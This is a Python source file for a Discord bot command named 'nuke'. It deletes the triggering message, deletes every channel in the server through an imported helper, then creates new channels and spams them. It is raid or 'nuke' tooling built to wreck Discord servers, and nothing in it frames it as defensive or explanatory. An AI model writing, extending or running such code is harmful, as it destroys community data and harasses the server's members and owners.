import discord
from discord.ext import commands
from src.operations.operations import delete_channels, create_channels_and_spam


class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="nuke")
    async def nuke(self, ctx: commands.Context):
        await ctx.message.delete()
        await delete_channels(ctx.guild)
        await create_channels_and_spam(ctx.guild)
